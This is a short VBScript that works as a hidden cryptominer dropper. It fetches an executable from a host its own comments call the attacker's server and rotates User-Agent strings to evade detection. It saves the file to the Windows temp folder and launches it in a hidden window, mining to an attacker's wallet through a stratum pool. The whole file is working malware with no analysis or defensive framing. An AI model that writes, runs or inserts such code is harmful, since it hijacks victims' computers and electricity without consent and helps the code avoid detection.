On Error Resume Next

Dim objHTTP, objFSO, objShell, objFile
Dim minerURL, minerPath, cmd, userAgentList

' Define mining URL (Attacker's Server)
minerURL = "http://mymst007.info:4000/ex?e=1"
minerPath = "C:\Windows\Temp\miner.exe"

' Create HTTP Object
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", minerURL, False

' Random User-Agent Strings to Evade Detection
userAgentList = Array( _
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/5.0)", _
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/5.0)", _
    "Mozilla/5.0 (Windows NT 6.1; AppleWebKit/537.11)", _
    "Mozilla/5.0 (Windows NT 6.1; rv:1.9.2.15) Gecko/201010303 Firefox/3.6.15")

Randomize
objHTTP.setRequestHeader "User-Agent", userAgentList(Int(Rnd() * 4))

' Send request and save response as file
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(minerPath, True)
    objFile.Write objHTTP.responseBody
    objFile.Close
End If

' Execute miner with arguments
Set objShell = CreateObject("WScript.Shell")
cmd = "cmd.exe /c " & minerPath & " -o stratum+tcp://crypto-pool.fr:3333 -u attacker_wallet -p x"
objShell.Run cmd, 0, False

' Clean up
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
